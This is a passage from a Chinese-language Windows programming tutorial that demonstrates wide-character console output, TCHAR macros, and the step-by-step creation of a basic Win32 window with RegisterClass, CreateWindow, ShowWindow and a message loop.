class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintUnicode</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* pszText = <span class="string">L&quot;阿斯代理商打马赛克代码卢萨卡代码&quot;</span>;</span><br><span class="line">wprintf(<span class="string">L&quot;%s\n&quot;</span>, pszText);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">PrintUnicode();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917222510026.png" alt="image-20250917222510026"></p><ul><li>下面就使用<code>WriteConsole()</code>打印中文</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintUnicode</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* pszText = <span class="string">L&quot;阿斯代理商打马赛克代码卢萨卡代码&quot;</span>;</span><br><span class="line"><span class="comment">//wprintf(L&quot;%s\n&quot;, pszText);</span></span><br><span class="line"><span class="comment">// Linux有三个标准文件描述符0、1、2，</span></span><br><span class="line"><span class="comment">// 而Windows也有三个标准句柄标准输入句柄、标准输出句柄、标准错误句柄</span></span><br><span class="line"><span class="comment">// 对于Windows标准句柄值是比较大的而且还不确定,需要使用GetStdHandle()这个函数去获取标准句柄</span></span><br><span class="line"><span class="comment">// 该函数只有一个参数,可以是STD_OUTPUT_HANDLE、STD_INPUT_HANDLE、STD_ERROR_HANDLE,返回值就是标准句柄的值</span></span><br><span class="line">HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">WriteConsole(hOut,pszText,wcslen(pszText),<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//C_char();</span></span><br><span class="line"><span class="comment">//W_char();</span></span><br><span class="line"><span class="comment">//T_char();</span></span><br><span class="line">PrintUnicode();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现如下乱码的原因是选用多字节字符，如果使用默认的<code>UTF</code>就能正确输出。</p><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917223326957.png" alt="image-20250917223326957"></p><h2 id="例子">例子</h2><ul><li>现在约定一下创建一个新项目的基本步骤，先创建一个新的项目，然后将其设置为启动项</li></ul><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917155038576.png" alt="image-20250917155038576"></p><ul><li>修改该项目的属性，选择<code>高级</code>，使用多字节字符集</li></ul><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917154418524.png" alt="image-20250917154418524"></p><p>如果是设置为<code>Unicode</code>编译器会默认有<code>Unicode</code>宏定义，如果使用多字节字符集编译器就不会默认<code>Unicode</code>宏定义，这主要是因为Window是有大量的系统调用函数的参数是<code>TCHAR*</code>、<code>const TCHAR*</code>类型。</p><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917154501016.png" alt="image-20250917154501016"></p><ul><li>例子1——正常的字符处理：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_char</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* pszText = <span class="string">&quot;hello char&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, pszText);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">C_char();</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917155115719.png" alt="image-20250917155115719"></p><ul><li>例子2——宽字节字符串：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_char</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* pszText = <span class="string">&quot;hello char&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, pszText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">W_char</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* pszText = <span class="string">L&quot;hello wchar&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = wcslen(pszText);</span><br><span class="line">wprintf(<span class="string">L&quot;%s %d\n&quot;</span>, pszText, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//C_char();</span></span><br><span class="line">W_char();</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// wcslen()这个函数求的不是该字符占多少个字节，而是求的该字符有多少个。</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917155451240.png" alt="image-20250917155451240"></p><ul><li>例子3——TCHAR：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_char</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* pszText = <span class="string">&quot;hello char&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, pszText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">W_char</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* pszText = <span class="string">L&quot;hello wchar&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = wcslen(pszText);</span><br><span class="line">wprintf(<span class="string">L&quot;%s %d\n&quot;</span>, pszText, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T_char</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> TCHAR * pszText = __TEXT(<span class="string">&quot;hello txt&quot;</span>); </span><br><span class="line"><span class="comment">// 如果没有定义unicode就会根据定义编译为char* pszText = &quot;hello txt&quot;;</span></span><br><span class="line"><span class="comment">// 如果定义了unicode就会根据定义编译为wchar_t * pszText = L&quot;hello wchar&quot;;</span></span><br><span class="line"><span class="comment">// 后面__TEXT(&quot;hello txt&quot;);主要就是根据宏定义#define __TEXT(quote) L## quote，#define __TEXT(quote) quote来判断的</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line">wprintf(<span class="string">L&quot;%s\n&quot;</span>, pszText);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;单:%s\n&quot;</span>, pszText);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//C_char();</span></span><br><span class="line"><span class="comment">//W_char();</span></span><br><span class="line">T_char();</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250917161824499.png" alt="image-20250917161824499"></p><h1 id="windows窗口程序">Windows窗口程序</h1><ul><li>接下来手敲一个Windows窗口程序，完全了解一下Windows窗口程序的创建过程。</li><li>总体概括一下Window窗口程序的创建过程（这个过程会接触到一些比较陌生的名词，之后会详细的说明）：<ul><li>定义WinMain函数</li><li>定义窗口处理函数（自定义，处理消息）</li><li>注册窗口类（向操作系统写入一些数据）</li><li>创建窗口（内存中创建窗口）</li><li>显示窗口（绘制窗口的图像）</li><li>消息循环（获取/翻译/派发消息）</li><li>消息处理</li></ul></li></ul><h2 id="简单创建一个windows程序">简单创建一个Windows程序</h2><ul><li>先创建一个<code>Winmain</code>函数，作为入口函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="type">int</span> CALLBACK <span class="title function_">WinMain</span><span class="params">(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR IpCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来就是创建一个窗口处理函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//窗口处理函数(用户自定义，处理消息)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProce</span><span class="params">(HWND hWnd, UINT msgID, WPARAM wParam, LPARAM IParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, msgID, wParam, IParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="type">int</span> CALLBACK <span class="title function_">WinMain</span><span class="params">(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR IpCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来就是在<code>WinMain</code>函数中注册一个窗口，也就是填写一些关于窗口的数据，并将数据写入到内核里面去。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//窗口处理函数(用户自定义，处理消息)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProce</span><span class="params">(HWND hWnd, UINT msgID, WPARAM wParam, LPARAM IParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, msgID, wParam, IParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="type">int</span> CALLBACK <span class="title function_">WinMain</span><span class="params">(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR IpCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//注册窗口类(向系统的内核中写入数据)，先创建一个结构体将这个结构体的值都设置好</span></span><br><span class="line">WNDCLASS wc = &#123; <span class="number">0</span> &#125;; <span class="comment">//初始化结构体</span></span><br><span class="line">wc.cbClsExtra = <span class="number">0</span>; <span class="comment">//申请缓冲区</span></span><br><span class="line">wc.cbWndExtra = <span class="number">0</span>; <span class="comment">//申请缓冲区</span></span><br><span class="line">    <span class="comment">// 上面是申请两种不同的缓冲区</span></span><br><span class="line">wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">3</span>);<span class="comment">// 注册窗口背景色 + 3是黑色，+1是白色</span></span><br><span class="line">wc.hCursor = <span class="literal">NULL</span>;<span class="comment">// 光标,给NULL是默认光标</span></span><br><span class="line">wc.hIcon = <span class="literal">NULL</span>;<span class="comment">// 图标,默认图标</span></span><br><span class="line">wc.hInstance = hIns;<span class="comment">// 将WinMain的第一个参数赋值给他</span></span><br><span class="line">wc.lpfnWndProc = WndProce;<span class="comment">// 用上面定义的窗口处理函数的名称赋值</span></span><br><span class="line">wc.lpszClassName = <span class="string">&quot;Main&quot;</span>;<span class="comment">// 窗口类名称随便起一个</span></span><br><span class="line">wc.lpszMenuName = <span class="literal">NULL</span>;<span class="comment">// 菜单,NULL是没有菜单</span></span><br><span class="line">wc.style = CS_HREDRAW | CS_VREDRAW; <span class="comment">// 当窗口水平或者垂直方向发生变化,重新画窗口图画</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用一个系统调用函数,将这个结构体直接写入到操作系统的内核中去</span></span><br><span class="line">RegisterClass(&amp;wc); <span class="comment">//将以上所有赋值全部写入操作系统</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来就是在内存创建窗口，也就是申请一块内存，将窗口的数据放到里面。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//窗口处理函数(用户自定义，处理消息)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProce</span><span class="params">(HWND hWnd, UINT msgID, WPARAM wParam, LPARAM IParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, msgID, wParam, IParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="type">int</span> CALLBACK <span class="title function_">WinMain</span><span class="params">(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR IpCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//注册窗口类(向系统的内核中写入数据)，先创建一个结构体将这个结构体的值都设置好</span></span><br><span class="line">WNDCLASS wc = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">wc.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wc.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">8</span>);</span><br><span class="line">wc.hCursor = <span class="literal">NULL</span>;</span><br><span class="line">wc.hIcon = <span class="literal">NULL</span>;</span><br><span class="line">wc.hInstance = hIns;</span><br><span class="line">wc.lpfnWndProc = WndProce;</span><br><span class="line">wc.lpszClassName = <span class="string">&quot;Main&quot;</span>;</span><br><span class="line">wc.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wc.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用一个系统调用函数,将这个结构体直接写入到操作系统的内核中去</span></span><br><span class="line">RegisterClass(&amp;wc); <span class="comment">//将以上所有赋值全部写入操作系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在内存中创建窗口(申请一块内存,将窗口的各种数据存储进去),使用的是CreateWindow()函数</span></span><br><span class="line">    <span class="comment">// 第一个参数就是wc.lpszClassName = &quot;Main&quot;;中所写的&quot;Main&quot;即窗口名称</span></span><br><span class="line">    <span class="comment">// 第二个参数是标题栏的信息,随便写</span></span><br><span class="line">    <span class="comment">// 第三个参数是创建窗口的基本风格</span></span><br><span class="line">    <span class="comment">// 第四个、第五个参数表示窗口的位置,即窗口左上角对应的平屏幕位置</span></span><br><span class="line">    <span class="comment">// 第六个、第七个参数表示窗口的大小,即打开窗口的默认大小</span></span><br><span class="line">HWND hWnd = CreateWindow(<span class="string">&quot;Main&quot;</span>, <span class="string">&quot;window&quot;</span>, WS_OVERLAPPEDWINDOW, <span class="number">100</span>, <span class="number">100</span>, <span class="number">500</span>, <span class="number">500</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hIns, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来就是根据<code>CreateWindow()</code>写入到内存中的数据在电脑屏幕上显示窗口。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//窗口处理函数(用户自定义，处理消息)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProce</span><span class="params">(HWND hWnd, UINT msgID, WPARAM wParam, LPARAM IParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, msgID, wParam, IParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="type">int</span> CALLBACK <span class="title function_">WinMain</span><span class="params">(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR IpCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//注册窗口类(向系统的内核中写入数据)，先创建一个结构体将这个结构体的值都设置好</span></span><br><span class="line">WNDCLASS wc = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">wc.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wc.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">8</span>);</span><br><span class="line">wc.hCursor = <span class="literal">NULL</span>;</span><br><span class="line">wc.hIcon = <span class="literal">NULL</span>;</span><br><span class="line">wc.hInstance = hIns;</span><br><span class="line">wc.lpfnWndProc = WndProce;</span><br><span class="line">wc.lpszClassName = <span class="string">&quot;Main&quot;</span>;</span><br><span class="line">wc.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wc.style = CS_HREDRAW | CS_VREDRAW; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用一个系统调用函数,将这个结构体直接写入到操作系统的内核中去</span></span><br><span class="line">RegisterClass(&amp;wc); <span class="comment">//将以上所有赋值全部写入操作系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在内存中创建窗口(申请一块内存,将窗口的各种数据存储进去)</span></span><br><span class="line">HWND hWnd = CreateWindow(<span class="string">&quot;Main&quot;</span>, <span class="string">&quot;window&quot;</span>, WS_OVERLAPPEDWINDOW, <span class="number">500</span>, <span class="number">100</span>, <span class="number">500</span>, <span class="number">500</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hIns, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示窗口,按照窗口的数据在屏幕上显示窗口ShowWindow()函数</span></span><br><span class="line"><span class="comment">// 借助一个Windows api</span></span><br><span class="line">    <span class="comment">// 第一个参数是CreateWindow()的返回值</span></span><br><span class="line">    <span class="comment">// 第二个参数是以什么方式显示,SW_SHOW是以原样显示</span></span><br><span class="line">ShowWindow(hWnd, SW_SHOW);</span><br><span class="line">    <span class="comment">// 还需要调用UpdateWindow(),其实不用调用也可以,但是微软建议调用</span></span><br><span class="line">    <span class="comment">// UpdateWindow()功能就是刷新窗口</span></span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>然后就是消息循环，窗口处理完肯定要保持显示状态，像上面那个代码窗口一画完就退出程序，窗口就会消失。</li><li>而正常来说窗口一般都有输入框、点击按钮、鼠标移动到那个图标上，这些都是用户对窗口的一些操作，消息处理基本上就是处理这些。</li><li>在处理消息之前首先需要接收消息，而接收消息肯定要窗口要一直显示用户才能对窗口操作，所以需要使用一个<code>while</code>循环，然窗口一直显示，消息一直在接收和翻译，最后会给用户自定义的窗口处理函数来处理一些用户对窗口的操作。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//窗口处理函数(用户自定义，处理消息)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProce</span><span class="params">(HWND hWnd, UINT msgID, WPARAM wParam, LPARAM IParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, msgID, wParam, IParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="type">int</span> CALLBACK <span class="title function_">WinMain</span><span class="params">(HINSTANCE hIns, HINSTANCE hPreIns, LPSTR IpCmdLine, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//注册窗口类(向系统的内核中写入数据)，先创建一个结构体将这个结构体的值都设置好</span></span><br><span class="line">WNDCLASS wc = &#123; <span class="number">0</span> &#125;;</span><br><span 